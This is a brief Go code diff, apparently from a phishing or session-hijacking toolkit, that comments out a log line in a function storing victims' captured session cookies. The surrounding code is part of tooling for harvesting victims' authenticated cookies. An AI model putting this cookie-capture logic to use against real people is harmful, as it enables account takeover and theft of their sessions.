@@ -137,8 +137,8 @@ func (module *Tracker) AddToCookieJar(v *Victim, cookie necrobrowser.SessionCook
 	cookieKey := fmt.Sprintf("%s_%s_%s", cookie.Name, cookie.Path, cookie.Domain)
 	victim.Cookies.Store(cookieKey, cookie)
 
-	module.Info("[%s] New cookie %s:%s [%s] (key: %s)", victim.ID, tui.Bold(cookie.Name), tui.Bold(cookie.Value),
-		tui.Bold(cookie.Domain), tui.Red(cookieKey))
+	//module.Info("[%s] New cookie %s:%s [%s] (key: %s)", victim.ID, tui.Bold(cookie.Name), tui.Bold(cookie.Value),
+	//	tui.Bold(cookie.Domain), tui.Red(cookieKey))
 
 	module.Victims.Store(victim.ID, victim)
 }
